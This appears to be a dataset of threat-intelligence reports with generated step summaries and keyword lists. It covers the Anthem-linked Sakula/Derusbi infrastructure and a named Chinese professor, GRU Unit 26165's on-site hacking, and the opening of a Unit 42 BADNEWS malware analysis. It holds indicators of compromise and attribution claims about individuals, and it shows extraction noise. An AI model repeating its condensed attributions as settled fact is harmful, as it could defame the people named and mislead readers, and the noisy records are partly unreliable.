DTOPTOOLZ Co. digital signature shifted from the we11point[.]com incident to another cluster of activity that occurred later in May 2014. We immediately reviewed Incident 20140526B: vaeit APT[21], an incident that we initially shared to our Subscriber Community on September 29, 2014 after conducting retrospective analysis. [22][23]Just as was the case with the we11point[.]com and prennera[.]com9 of 3303/22/2015 10:14 PMurl the VAE, Inc. incident is also believed to be associated with Chinese APT espionage activity. In this case the adversary also used Derusbi / Sakula malware that was signed with the DTOPTOOLZ Co. digital signature and con�gured to communicate with faux infrastructure appearing to be masquerading as internal resources for the Department of Defense Contractor VAE, Inc. Additionally, in response to an inquiry from KrebsOnSecurity, VAE, Inc. would later con�rm[24] that it had indeed been a target of a failed spearphishing attempt in May 2014 which used the malicious faux VAE, Inc. themed domain.The targeted incident relied upon the Sakula executable MD5: 230D8A7A60A07DF28A291B13DDF3351F[25] which had a XOR 0x9A encoded C2 callbacks to the IP address 192.199.254[.]126 (registered to Wehostwebsites[.]com – “Tom Yu” of Baoan, Shenzhen City, Guangdong Province, China) as well as a hardcoded callback to sharepoint-vaeit[.]com. Passive DNS of the static C2 IP 192.199.254[.]126 revealed a single suspicious domain of interest – topsec2014[.]com. This domain had historic resolution around May 8, 2014 within a month of the �rst observed Sakula activity using the IP 192.199.254[.]126 as C2.[26]10 of 3303/22/2015 10:14 PMurl historic Whois, we discovered that topsec2014[.]com was initially registered by li2384826402@yahoo[.]com on May 6th, 2014. Although the li2384826402@yahoo[.]com registrant is likely a reseller given that it has been observed registering several thousands of other domains, the fact that it was used to register both the faux VAE, Inc. C2 infrastructure and the overlapping domain topsec2014[.]com within the same month suggests that there may be a relationship between the client of the reseller for the VAE, Inc. infrastructure and the client for topsec2014[.]com.[28]11 of 3303/22/2015 10:14 PMurl four minutes after the initial registration of topsec2014[.]com, the Whois records were updated from the initial registrant, Li Ning – li2384826402@yahoo[.]com to TopSec China – TopSec_2014@163[.]com. This domain record has been unchanged since May 7th 2014. The we11point[.]com infrastructure and by extension the faux VAE Inc. infrastructure is associated with Cluster 2 of the ScanBox framework[30] by PwC. The latest PwC update to ScanBox states that there are “links between the domain allegedly used in the Anthem hack (we11point.com) to Cluster 2 through shared WHOIS details.”OPM Themed InfrastructureOne notable pattern was how the domain Whois registration information for the VAE, Inc. themed infrastructure was quickly updated and obfuscated with pseudorandom 10 character gmx.com email addresses and using the names of various comic book characters from the Iron Man franchise. This comic-themed naming convention has been previously documented by our friends at Crowdstrike[31] in what they characterize as being associated with a Chinese APT group they have dubbed “Deep Panda”.Leveraging our DomainTools partnership, we were able to12 of 3303/22/2015 10:14 PMurl the outlier domain opm-learning[.]org. This domain was also purportedly registered by the Iron Man movie hero “Tony Stark” on July 28, 2014. This infrastructure naming convention suggests a possible Of�ce of Personnel Management (OPM) theme. However, in this case we lacked any speci�c sample of malware to verify our initial suspicions that this infrastructure was operational. The possible OPM reference in the domain name is noteworthy considering it was revealed in July of 2014 that OPM had been compromised[32] by a likely state-sponsored Chinese actor in mid-March of that year. The fact this domain was registered after the breach occurred suggests that OPM could be an ongoing direct target of Chinese state-sponsored cyber espionage activity.Our attention then turned to the FBI Flash Report A-000049- MW[33] that was publicly reported by Brian Krebs [34]on February 6th, 2015. This FBI Flash Report was issued on January 27th, 2015, the same day an Anthem administrator detected suspicious activity according to an internal memo[35]. This memo goes on to indicate that the FBI would not be party to the Anthem breach until they were noti�ed on January 29th, 2015; based on these facts we assess with high con�dence that it is very unlikely that the FBI Flash Report was directly related to the Anthem breach. Rather, we suspect that the FBI �ash report likely references the USIS breach that was announced[36] on August 6, 2014, or the previous OPM breach, considering the statement that the breach involved “compromised and stolen sensitive business information and Personally Identi�able Information (PII) from US commercial and13 of 3303/22/2015 10:14 PMurl networks through cyber espionage.”The malware referenced within the FBI Report is associated with a Derusbi backdoor subvariant named “InfoAdmin” / “Kakfum” where the FBI speci�cally references open source reporting of “Deep Panda” as being related to the malware observed in the attack. The malicious infrastructure highlighted in the report are the domains images.googlewebcache[.]com and smtp.outlookssl[.]com. Both of these top level domains were included with other related domains, all of which were shared on September 16th, 2013 to the ThreatConnect Subscriber Community in Incident 20130823C: Some.Trouble APT Domains[37], roughly a year and half prior to the FBI Flash report.It is important to mention that both the domains images.googlewebcache[.]com and smtp.outlookssl[.]comas were also previously identi�ed in an October 2014 PwC blog post[38] as seen within Cluster 1 of the Scanbox framework, while the Sakula activity with we11point and VAEIT is contained within Cluster 2 of that report. This implies that the actor referenced within the FBI Flash report uses shared capabilities (in this case the ScanBox kit) with the Sakula / we11point actor.Section Summary:The Derusbi / Sakula malware seen in both the we11point[.]com and VAE Inc. campaigns were structurally the same and digitally signed with the DTOPTOOLZ signature.14 of 3303/22/2015 10:14 PMurl emerging theme is that this particular signature and family of malware is highly indicative of a particular Chinese APT activity. Within this web of malicious infrastructure, there is an interesting overlap with the topsec2014[.]com domain and attack infrastructure. TCIRT identi�ed a domain opm-learning[.]org that had a similar superhero themed WHOIS registrant to the Sakula / VAE Inc. infrastructure. The possible OPM reference is noteworthy considering the Of�ce of Personnel Management (OPM) was compromised in March 2014. Additionally, an FBI Flash Report 0000-49MW referenced indicators that were possibly associated with the USIS hack and a Derusbi variant called “Kakfum” / “InfoAdmin”. Both the FBI Flash infrastructure and the Sakula / VAE Inc. infrastructure are tied to the capability usage of the ScanBox framework, residing in Clusters 1 and 2 respectively.Unveiling Song Yubo and Southeast University:The ProfessorWe conducted open source research in pursuit of further information on the TopSec_2014@163[.]com email registrant. A keyword search returned several results for “topsec2014@163[.]com” in association with a number of academic institutions in Nanjing, China. Although the email15 of 3303/22/2015 10:14 PMurl wasn’t an exact match to the topsec2014[.]com domain registrant (notice the absence of the underscore), such a similarity warranted further investigation. [39][40]16 of 3303/22/2015 10:14 PMurl examined the links for any relevant intelligence, and discovered that nearly all of the search results led to pages that contained an announcement for an information security competition sponsored by the Southeast University-Topsec Information Security and Mobile Internet Technology Joint Research Center. This entity appears to be a joint research venture between the University and Chinese networking giant Beijing Topsec Network Security Technology Co., a.k.a. Beijing Topsec.[41]17 of 3303/22/2015 10:14 PMurl announcements list a Professor “Song Yubo” as the point of contact for the event, and directs interested parties to his email address, topsec2014@163[.]com, for further questions.[43][44]According to his LinkedIn page, Song is a Teacher at the Southeast University, speci�cally interested in the �eld of telecommunications. Additionally, he is an avid researcher, and has published numerous academic papers on computer network exploitation on various e-journal publication sites, such as Google Scholar[45]. Further, he lists skills such as “cryptography,” “penetration testing” and “computer network security,” etc. on his Research Gate pro�le[46].18 of 3303/22/2015 10:14 PM[47]url we continued to develop a pro�le on Professor Song, we began to have the sense that his interest in information security research strongly overlapped with that of someone who might be interested in or at least capable of conducting sophisticated cyber attacks. However, interests alone are not enough to warrant reasonable suspicion, so we had to do more digging.Additionally, the soft link between TopSec_2014@163[.]com and topsec2014@163[.]com alone was not suf�cient to make19 of 3303/22/2015 10:14 PMurl with any reasonable con�dence, but as it turns out, Yubo has in fact been previously named as a person of interest in the context of offensive Chinese cyber activity.The UniversityIn March 2012, Northrop Grumman presented a commissioned report to Congress[49] detailing Chinese cyber warfare capabilities. The report asserts with high con�dence that both Song and the Information Security Research Center at Southeast University have received numerous state-sponsored research grants, and by extension, cooperated with the Government of China in conducting information security research and development (R&D). As stated on Southeast University’s own website, the main purpose of these grants are to develop technical acumen amongst its students via providing support for “state-owned scienti�c research institutions, state key enterprises, government agencies and People’s Liberation Army (PLA) units.” [50]20 of 3303/22/2015 10:14 PMurl University is one of only three Chinese academic institutes that receives funding from all �ve of the State grant programs. Song himself has also conducted his fair share of state- sponsored research, notably under the National Ministry of State Security 115 Program – a highly sensitive research grant to fund ambiguous information warfare R&D, almost certainly in support of PLA programs.The CompetitionAs we can see, the evidence continued to stack up. The real smoking gun, however, was when we began to notice a strong temporal overlap with the various stages of the TOPSEC Cup that Song and Beijing Topsec were organizing, and the registration dates of malicious infrastructure as well as the malware compilation dates.[52]21 of 3303/22/2015 10:14 PMurl upon the translated registration form that we obtained from Song Yubo’s personal Baidu document sharing account, open registration for the “TOPSEC Cup” began on May 4th, 2014 and would close on May 14th, 2014.The details of the competition that were shared on the announcement are extremely ambiguous, and probably for good reason. The introductory paragraph mentions that the primary goal of the event is to facilitate the training and discovery of new talent, noting that exceptional participants would receive priority consideration for internships and jobs with Beijing Topsec.The event itself was broken down into several distinct rounds of competition. Firstly, the preliminary round required that all eligible registrants would attempt to remotely access and navigate through the network. Should a participating team perform exceptionally in the preliminary qualifying round, they would be invited to participate in the �nal round on-site in Nanjing.22 of 3303/22/2015 10:14 PMurl this �nal round, participants would be required to build their own “information systems and network environments.” The announcement notes that the students must rely upon their own laptop and software tools to accomplish this task. Further, the announcement notes that participants are prohibited from attacking the provided server as well as their competitors.Section Summary:Song Yubo and his research center at Southeast University appear to be central players in this narrative, as highlighted by their �nancial connections to the government of China, in particular the Ministry of State Security (MSS), China’s premier human intelligence agency. If the MSS was involved, we can deduce that the Anthem hack could have been for the purposes of gathering sensitive information for follow-on HUMINT targeting via blackmail, asset recruitment or technical targeting operations against individuals at home. Song’s use of the topsec email alias suggests a greater association w/ TOPSEC. It seems as if the competition is almost certainly the cause for the topsec2014[.]com domain. What is very curious, however, is the initial registration by the reseller li2384826402@yahoo[.]com, which is a tactic seen within the con�rmed malicious faux VAE Inc.infrastructure. The overlap between the competition website and the static command and control infrastructure seen in the Derusbi /23 of 3303/22/2015 10:14 PMurl implant is was likely an error made by the attackers.Tianrongxin, a.k.a. Beijing Topsec Technology Co:The CompanyTo enhance our open-source capabilities, we partnered up with Dr. James Mulvenon[54] and his team of China experts at Defense Group, Inc. (DGI)[55]. We shared with them everything that we knew at the time, walking through the technical details which led us all the way to Song Yubo and the competition announcement. From there, they were able to uncover a wealth of very consequential background information on Beijing Topsec Technology Co (Beijing Topsec), the sponsoring organization for Song Yubo’s information security competition.DGI’s research indicated that Beijing Topsec is one of the largest information security hardware providers in China. In 1996, they were the �rst Chinese company to break into the market with the release of China’s �rst indigenously-manufactured �rewall. Since then, they have expanded their business to include a consulting practice focused on issues such as vulnerability mining, software code analysis, threat intelligence, and encryption R&D, amongst other things.The company served as a core technical support unit for network24 of 3303/22/2015 10:14 PMurl at the 2008 Olympic Games – an event which was tightly controlled by the state. Additionally, Beijing Topsec is a known partner of the Chinese military. Since 2009, the company has possessed information publication credentials for military network procurement. Since 2013, they have been publicly recognized as the Chinese equivalent of a cleared defense contractor.The links between Beijing Topsec and the Chinese government are fairly substantial, highlighted by long-standing partnerships between even the most shadowy elements of the Chinese military.The Leaked CableA very compelling piece of evidence is found in the contents of a leaked 2009 diplomatic security cable from the Department of State, published by The Guardian.[56] The cable is a daily digest of Diplomatic Security alerts – essentially a situational awareness primer for State Department employees to inform them of new and existing threats. In one section, the cable highlights that the Founder of Beijing Topsec, He Weidong, had openly talked about receiving directives from the PLA in an interview with China News Network. In the interview, the founder quite curiously states that Topsec is less a commercial entity, but rather a research institute, and that the company received about half of its start-up capital directly from the PLA. The cable further claims that Topsec actively recruits for the PLA cyber army.25 of 3303/22/2015 10:14 PM[57]url would also appear that not only does Beijing Topsec have deep ties to state-run cyber activity, but also within the independent hacker community as well. Of note, the company hired the notorious hacker Lin Yong, a.k.a. “Lion” (of the Honker Union of China[59]) in the early 2000s as a security service engineer and to conduct network training.Section Summary:It is not surprising that the Chinese government would be interested in partnering with a private organization such as Beijing Topsec for use as a front for state-sponsored activity. The association between Southeast University and Beijing Topsec as manifested in the joint information security research center highlights the possibility of growing links between26 of 3303/22/2015 10:14 PMurl activity and academic institutions, particularly those that receive funding from the central government. All in all, it would seem that China is pursuing a uni�ed approach to cyber operations, relying on all unique facets of the workforce: academia, private industry, and independent hackers, as well as the PLA to achieve their strategic goals.Conclusion:The Anthem breach exposes the insidious reality of modern Chinese cyber espionage as it continues its unrelenting strikes at the soft underbelly of the American way of life. Moreover, it demonstrates the imposing yet increasingly common reality of conducting threat intelligence analysis without substantial threat intelligence to start with. Fortunately for us, we were able to deduce informed answers to some of the outstanding questions to this breach by scrutinizing our archival data troves that are ef�ciently stored within our Threat Intelligence Platform and partner integrations. In the �eld of cyber security, industry professionals must learn to play the long game in order to generate a proactive sense of situational awareness, allowing for greater ef�ciency and �exibility in mitigating future threats.Additionally, this incident underscores the frustrating disparity of the industry when it comes to naming conventions. With so many threat actors and indicators �oating around, it is can be frustrating to keep track of all the disparate pieces of evidence,27 of 3303/22/2015 10:14 PMurl when countless naming conventions are applied. Without the use of a Threat Intelligence Platform to keep track of the �ood of incoming threat data, this task would be extraordinarily time consuming at best and crippling at worst.Moving forward, it is important to bear in mind that the adversary, regardless of country of origin, shall almost certainly leverage our every weakness against us. Even something as seemingly innocuous as confusion over names can easily consume analytical bandwidth, creating a window of opportunity to strike. We – that is security professionals, private industry and governments alike – must proactively harden our network defenses and hasten our incident responses as a united, synchronous entity.We have shared details on Song Yubo[60] and af�liated indicators within the ThreatConnect Common Community. This share also includes the full-text DGI “BLUE HERON” research[61] which provides greater insight into Song Yubo, Southeast University and Beijing Topsec.All things considered, industry must learn to adopt a cooperative defense mindset in the hopes of rebuf�ng future attacks. The most resolute defense we have is each other, so be like the TCIRT and start actively defending your own community from the next big breach. Register for a free ThreatConnect account today[62] to get started sharing and analyzing your threat intelligence.1.url of 3303/22/2015 10:14 PMurl insurance-agency-to-be-breached?utm_campaign=Anthem-Hack-Blog- Post&utm_source=from-anthem-post4.url /what_is_threat_intelligence_platform7.url 14231037208.url /threatconnect_intelligence_research_team10.url�le /analysis/11.url�le /analysis/12.url inc-announces-expansion-data-services-powerful-domain-passive- dns-intelligence/13.url networking-biomed-life-sciences-industry/14.url of 3303/22/2015 10:14 PMurl /wellpoint-evil2legit1.jpg16.url /wellpoint-evil2legit1.jpg17.url�le /analysis/18.url /premera-update.jpg19.url suspect-china-may-be-responsible-for-hack-of-anthem/2015/02 /05/25fbb36e-ad56-11e4-9c91-e9d2f9fde644_story.html21.url /incident.xhtml?incident=70892622.url VAE-Overlaps.jpg23.url VAE-Overlaps.jpg24.url in-april-2014/25.url�le /analysis/26.url /li-reg-overlaps1.jpg30 of 3303/22/2015 10:14 PMurl /li-reg-overlaps1.jpg28.url /topsec2014-hist.png29.url /topsec2014-hist.png30.url�les/cto-tib-20150223-01a.pdf31.url malware-target-organizations-multiple-sectors/32.url hackers-go-after-us-workers-personal-data/2014/07/10 /92db92e8-0846-11e4-8a6a-19355c7e870a_story.html33.url Warning-Deep-Panda.pdf34.url con�rms-data-breach-but-full-extent-remains-unknown.html36.url /dhs-contractor-suffers-major-computer-breach-of�cials-say/2014 /08/06/8ed131b4-1d89-11e4-ae54-0cfe1f974f8a_story.html37.url /incident.xhtml?incident=3908338.url framework-whos-affected-and-whos-using-it-1.html39.url of 3303/22/2015 10:14 PMurl /Screen-Shot-2015-02-25-at-5.20.37-PM.png41.url /Screen-Shot-2015-02-23-at-9.22.35-AM.png42.url /Screen-Shot-2015-02-23-at-9.22.35-AM.png43.url /Translation.png44.url /Translation.png45.url�le/Song_Yubo47.url /yubo-stacked.png48.url /yubo-stacked.png49.url~nsarchiv/NSAEBB/NSAEBB424/docs/Cyber- 066.pdf50.url /relationships.jpg51.url /relationships.jpg52.url /Screen-Shot-2015-02-26-at-4.12.20-PM.png32 of 3303/22/2015 10:14 PMurl /Screen-Shot-2015-02-26-at-4.12.20-PM.png54.url�les/Mulvenon_Bio.pdf55.url /21446257.url /lin-yong-lion.png58.url /lin-yong-lion.png59.url hacking-group-reboots/60.url /adversary.xhtml?adversary=72617561.url /document.xhtml?document=72619062.url of 3303/22/2015 10:14 PM "," 1. Hackers sent spearphishing emails to targets in 2014 impersonating IT systems of healthcare companies. 2. If emails were opened, malware like Derusbi/Sakula would infect the systems and communicate with command servers controlled by the hackers. 3. The malware gathered data from the systems over months. 4. Eventually the hackers were able to steal personal data on tens of millions of customers from Anthem's systems. 5. The data was likely used for Chinese cyber espionage purposes rather than financial theft. ",valid_52,"['2014', 'Healthcare', 'Derusbi', 'Sakula', 've', 'control', 'the hackers', 'the malware', 'data', 'months', 'customers', 'anthem', 'use', 'Chinese', 'cyber espionage']",2014; Healthcare; Derusbi; Sakula; ve; control; the hackers; the malware; data; months; customers; anthem; use; Chinese; cyber espionage.
"www.atlanticcouncil.org /content-series/tech-at-the-leading-edge/the-russian-cyber-unit-that-hacks-targets-on-site/ GRU 26165: The Russian cyber unit that hacks targets on-site ⋮ 11/18/2022By Justin ShermanRussian hackers are not always breaching targets from afar, typing on their keyboards in Moscow bunkers or St. Petersburg apartment buildings. For some Russian government hackers, foreign travel is part of the game. They pack up their equipment, get on international flights, and covertly move around abroad to hack into computer systems.Enter GRU Unit 26165 (of the military intelligence agency Glavnoye Razvedyvatelnoye Upravlenie), a military cyber unit with hackers operating remotely and on-site. Despite the security risks on-site cyber operations pose to governments and international organizations, and the questions they raise about how the West should track and combat Russian state hacking, Russia’s activities in this realm are not receiving sufficient policy attention.GRU Unit 26165, the 85th Main Special Communications CenterIn March 2018, after the GRU tried to murder former Russian intelligence officer Sergei Skripal and his daughter Yulia in Salisbury, England using a Novichok nerve agent, the Kremlin came under international fire. British intelligence officials blamed the GRU, where Skripal used to work (and later became a British informant); the multinational Organization for the Prohibition of Chemical Weapons (OPCW), which enforces the Chemical Weapons Convention, launched an investigation; and in June of the same year, OPCW countries voted to let the body attribute chemical weapons attacks to particular actors. (A year later, the OPCW would formally ban Novichok nerve agents.) Additional journalistic investigations into the perpetrators, meanwhile, continued to point to the GRU’s involvement.Although the OPCW’s investigation was not made public for months, the Russian government decided to move quickly against the organization, turning to a tactical cyber unit to do so.1/4OPCW HeadquartersOn April 10, 2018, four Russian nationals landed at Amsterdam Schiphol Airport in the Netherlands. With diplomatic passports in hand, they were met by a member of the Russian embassy in The Hague. After loading a car with technical equipment—including a wireless network panel antenna to intercept traffic—the four individuals scouted the OPCW’s headquarters in The Hague for days, taking photos and circling the building before being intercepted by the Dutch General Intelligence and Security Service (Algemene Inlichtingen- en Veiligheidsdienst or AIVD) and sent back to Moscow. Seemingly, the plan had been for the operatives to hack into the OPCW’s systems to disrupt investigations into the attempted GRU chemical weapon attack.The Netherlands made all of this public on October 4, 2018, with Dutch intelligence identifying the four operators by name—Aleksei Sergeyevich Morenets and Evgenii Mikhaylovich Serebriakov were described as “cyber operators” and Oleg Mikhaylovich Sotnikov and Alexey Valerevich Minin were described as “HUMINT (human intelligence) support.” The AIVD linked all of these individuals to Russia’s GRU. A Department of Justice (DOJ) indictment issued on the same day went a step further, linking the hackers—Morenets and Serebriakov—to GRU Unit 26165.Unit 26165, otherwise known as Fancy Bear, was already known for breaking into systems from afar, including the Democratic National Committee in 2016 and World Athletics (previously the International Amateur Athletic Federation) in 2017. Yet, the revelations around the attempted OPCW hack made clear that Unit 26165 does much more. The full DOJ indictment, subsequently published by the National Security Archive at The George Washington University, alleged that Morenets “was a member of a Unit 26165 team that traveled with technical equipment to locations around the world to conduct on-site hacking operations to target and maintain persistent access to WiFi networks used by victim organizations and personnel.” Serebriakov also belonged to such a team. While Unit 26165 often conducts remote hacks from Russia, the indictment stated that “if the remote hack was unsuccessful or if it did not provide the conspirators with sufficient access to victims’ networks,” Unit 26165 would carry out “‘on-site’ or ‘close access’ hacking operations.”The OPCW incident was not the first time these particular hackers went abroad to conduct operations. According to the DOJ, Morenets traveled to Rio de Janeiro, Brazil, and Lausanne, Switzerland, in 2016 to breach the into WiFi networks used by people with access to the US Anti-Doping Agency, the World Anti-Doping Agency, and the Canadian Center for Ethics in Sport. Serebriakov, the indictment stated, also participated in these on-site hacking operations. Both individuals allegedly planned to target the Spiez Laboratory in Switzerland after the OPCW hack. The indictment alleged that Ivan Sergeyevich Yermakov, also part of GRU Unit 26165, provided remote reconnaissance support for his colleagues’ on-site hacking operation against the OPCW.Additionally, it is speculated that these on-site hackers were supported by another GRU unit, which is where the other two Russians caught in the Netherlands by the AIVD enter the picture. Sotnikov and Minin were described generically by the Dutch as HUMINT support for the two hackers, and as “Russian military intelligence officers” by the DOJ’s full indictment. Neither of these government documents mentions a specific GRU unit associated with Sotnikov or Minin.Published in tandem with the October 4, 2018 state disclosures was a new Bellingcat investigation linking Morenets’ Russian car to the Unit 26165 building in Russia. It also linked Minin’s car registration to the GRU “Conservatory.” The Conservatory—formally numbered GRU Unit 22177—is the Russian Defense Ministry’s Military Academy and a training site for the GRU, located in Moscow near GRU headquarters and other GRU training facilities. Due to Minin’s connection to 22177 and the Dutch and US governments’ vague references to Sotnikov and Minin as “HUMINT support” and “Russian military intelligence officers” separate from Unit 26165, numerous articles have speculated that operatives from another GRU unit were tasked to support the mission in The Hague.Stepping back, assessing the picture2/4Policymakers should use this information as a case study for how Russian government hackers—and, theoretically, state hackers from other adversary countries—move around the world to break into systems. The use of on-site cyber operations abroad seems unique to this GRU team, with many possible motivations at play. It is unclear how high up the oversight chain these on-site operations go. What is clear, though, is that Western governments cannot restrict their hunt for Russian hackers to the digital sphere; they must also remember how Russian hacking fits into broader Russian intelligence activities, including overseas.There are several takeaways and implications that result from this information. The on-site, overseas cyber operations of GRU Unit 26165 appears to stand out from other Russian government cyber units. Of course, cyber capabilities are a part of intelligence operations more broadly, and many human operations around the world leverage cyber reconnaissance on an ongoing basis. Nonetheless, when the United Kingdom (UK) released its own statement on Russian government cyber activity in October 2018, it clearly differentiated between the activities of Unit 26165 in the Netherlands, Brazil, and Switzerland and those of Unit 74455 (Sandworm), which it stressed “were carried out remotely—by GRU teams based within Russia.” The DOJ indictment appears to suggest, although this is not totally clear, that hackers going abroad are part of at least one specific sub-team within the broader cyber unit. Further, the DOJ indictment lists numerous examples of on-site hacks or hack attempts, but publicly available information has not exposed the same kind of on-site operations by Russia’s Foreign intelligence Service, the SVR.The motivations behind the on-site operations of Unit 26165 are also a key question. Based on publicly available information, its proclivity for “close access” operations leans toward disrupting high-profile investigations into potentially embarrassing Russian government activity. The first set of reported hacks targeted international investigations into allegations of Russian doping at the Olympics; the second set of hacks targeted the international investigation into the attempted murder of the Skripals with chemical weapons. It is possible, therefore, that protecting the Kremlin’s image is a high priority. Simultaneously, the DOJ indictment stated that Unit 26165 carries out on-site operations when remote operations are unsuccessful, suggesting a more functional, effects-oriented motive for sending hackers overseas.However, there is another possibility: The GRU may simply be using on-site operations when it needs to draw attention away from its own failures. The botched attempt to murder Sergei and Yulia Skripal was carried out by GRU Unit 29155, a Russian military intelligence and assassination team with close relationships to the Signal Scientific Center federal research facility and the Ministry of Defense’s State Institute for Experimental Military Medicine in St. Petersburg, entities suspected of managing Russia’s Novichok program. GRU operatives are well-known for their high-risk appetites and sometimes overt violence, even relative to other Russian intelligence organs like the Federal Security Service (FSB), Russia’s domestic security agency. (That said, the FSB is a violent organization, too, carrying out repressive tactics in Russia and, in 2019, assassinating a Georgian asylum seeker in Berlin.)This tendency is playing out in cyberspace already, given that GRU teams are behind the NotPetya malware attack, shutdowns of Ukrainian power grids, and other more destructive, publicly visible operations. Such cyber activities, in line with broader intelligence cultures, stand in contrast to agencies like the SVR, which appears to place a premium on covertness, both online and offline. Wanting to frantically undermine an investigation into its own failed operation, it is not out of the question that the GRU sent Unit 26165 operatives overseas. That Unit 26165 hackers Morenets and Serebriakov may have had support from other parts of the GRU (HUMINT operators Sotbikov and Minin) in the OPCW plot suggests possible broader intra-agency coordination. But again, it is easy—and sometimes misguided— to assume there is more coordination within the Russian security services than actually occurs.All of this raises a final and more interesting question always at play in the Russian cyber ecosystem: How far up the chain does oversight of on-site hacks go?Cyber and information operations with high political sensitivity, which Moscow conceptualizes more cohesively than in the West, are more likely to be supervised by the Kremlin. The US intelligence community assessed, for example, that the influence actions targeting the 2016 US election were “approved at the highest levels of the Russian government,” and a similar conclusion was reached vis-à-vis President Vladimir Putin and Russia’s election interference in 2020. This may also be true for more traditional intelligence operations. When the UK finished its investigation into the murder of former Russian spy Alexander Litvinenko, who was killed on British soil with the3/4radioactive material Polonium-210, it concluded that Putin and Russian Security Council head Nikolai Patrushev “probably” approved the killing.The GRU’s botched murder attempt on the Skripals garnered significant international attention. At the time, Russian officials were already criticizing the OPCW’s investigations into the Assad regime’s use of chemical weapons in Syria —called an attempt “to make the OPCW draw hasty but at the same time far-reaching conclusions” by Russia’s deputy foreign minister. When the investigation into the Skripal poisonings began, senior officials like Russian Foreign Minister Sergei Lavrov falsely claimed that a lab used by the OPCW picked up traces of a nerve agent possessed by NATO countries but not Russia. Putin, meanwhile, has always held particular contempt for people he perceives as betraying the Russian nation, once saying that “traitors always meet a bad end,” suggesting a kind of personal anger directed at individuals like Sergei Skripal who became agents for the West. The Olympic doping investigations, too, proved an embarrassment for Moscow.In this vein, it is quite possible that higher-level Kremlin officials may direct the GRU to act against investigations like OPCW’s, prompting the GRU to deploy Unit 26165 hackers to the Netherlands. It is also plausible that the activities of Unit 26165 merely reflect broader intelligence collection priorities, spying on those trying to “hurt” Russia, such as investigators looking into Russian athlete doping. Since there are few publicly known cases of Unit 26165 conducting “close access” operations, perhaps these are not representative samples, with the GRU carrying out these activities on its own after all.Regardless, the GRU is clearly sending hackers overseas to carry out operations. Going forward, Western intelligence and law enforcement personnel, as well as multinational organizations, would be wise to pay attention.Image: OPCW Headquarters© 2022 Atlantic Council All rights reserved.4/4 "," 1. GRU Unit 26165 operators travel abroad with technical equipment. 2. They scout the target facility and intercept wireless network traffic. 3. The operators attempt to hack into the target network and systems from close physical proximity. 4. If successful, they maintain persistent access for remote hacking later. ",valid_6,"['GRU Unit 26165', 'technical equipment', 'traffic', 'systems', 'persistent access']",GRU Unit 26165; technical equipment; traffic; systems; persistent access.
"Get SupportENMENUGet updates: Unit 42 Sign up to receive the latest news, cyber threat intelligence and research from Unit42Business EmailBlog Home > Unit 42 > Patchwork Continues to Deliver BADNEWS to the Indian SubcontinentPatchwork Continues to Deliver BADNEWS to the Indian SubcontinentBy Brandon Levene, Josh Grunzweig and Brittany Ash March 7, 2018 at 5:00 AM Category: Unit 42 Tags: BADNEWS, Dropping Elephant, India, Monsoon, Pakistan, patchwork 9,597 (5) Summary In the past few months, Unit 42 has observed the Patchwork group, alternatively known as Dropping Elephant and Monsoon, conducting campaigns against targets located in the Indian subcontinent. Patchwork threat actors utilized a pair of EPS exploits rolled into legitimate, albeit malicious, documents in order to propagate their updated BADNEWS payload. The use of weaponized legitimate documents is a longstanding operational standard of this group. The malicious documents seen in recent activity refer to a number of topics, including recent military promotions within the Pakistan Army, information related to the Pakistan Atomic Energy Commission, as well as Pakistan’s Ministry of the Interior. The BADNEWS malware payload, which these malicious documents ultimately deliver, has been updated since the last public report in December 2017. BADNEWS acts as a backdoor for the attackers, providing them with full control over the victim machine. It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”. After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers. We’ve observed modifications to how the malware obtains its (C2) server information, as well asConvert webpages to pdf online with PDFmyURLreCAPTCHASUBMIT Please upgrade to a supported browser to get a reCAPTCHA challenge.Alternatively if you think you are getting this page in error, please check your internet connection and reload.TRENDING ARTICLESWhy is this happening to me?Where to Find Us At RSA Conference 2018!The Cybersecurity Moonshot and Zero TrustNews of the Week: April 7, 2018Channel Scoop: April 6, 2018modifications to the C2 communication. These changes to BADNEWS, as well as the use of recent EPS-based exploits, demonstrate that the group are actively updating their toolsets in efforts to stay ahead of the security community. In this posting, we detail our findings and document these changes. The malicious documents that Unit 42 examined contained legitimate decoy lures as well as malicious embedded EPS files targeting the CVE-2015-2545 and CVE-2017-0261 vulnerabilities. These vulnerabilities are well covered in previous public works, which can be found from PWC and FireEye. Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability. The lures are primarily documents of interest to Pakistani nuclear organizations and the Pakistani family. When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:%PROGRAMDATA%\Microsoft\DeviceSync\VMwareCplLauncher.exe %PROGRAMDATA%\Microsoft\DeviceSync\vmtools.dll %PROGRAMDATA%\Microsoft\DeviceSync\MSBuild.exeIn the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload. The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool. After the files are dropped, the VMwareCplLauncher.exe executable is run, which in turn loads the vmtools.dll DLL file. This DLL file creates a scheduled task named BaiduUpdateTask1, which attempts to run the malicious, spoofed MSBuild.exe every subsequent minute. The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past. The flow of execution from the time the victim opens the malicious Microsoft Word document, to the execution of BADNEWS, may be seen below:Convert webpages to pdf online with PDFmyURLFigure 5 Side-loading technique employed to deliver BADNEWSThe following image demonstrates the scheduled task created by the modified vmtools.dll to ensure BADNEWS runs and remains running on the victim machine.Convert webpages to pdf online with PDFmyURLFigure 6 Scheduled task created to load BADNEWSBADNEWS Much of BADNEWS has remained consistent from when it was originally discussed by Forcepoint in August 2016. Additionally, recent analysis by Trend Micro notes some minor changes during 2017. To briefly recap, the BADNEWS malware family acts as a backdoor, with communication occurring over HTTP. A number of commands are provided to the attackers, including the ability to download and execute additional information, upload documents of interest, and take screenshots of the desktop. The malware collects C2 information when it is originally executed via “Dead Drop Resolvers”. Dead drop resolvers have been used by multiple threat actor groups using various malware families and those behind Patchwork are well versed with this tactic. This tactic uses public web services to host content that contains encoded commands that are decoded by the malware. For the remainder of the analysis in this research blog, we are discussing the following file:SHA256 2017-12-22 11:54:03 UTCConvert webpages to pdf online with PDFmyURLOne of the first modifications we witnessed in this new variant of BADNEWS is a new mutex that is created to ensure a single instance of BADNEWS is running at a 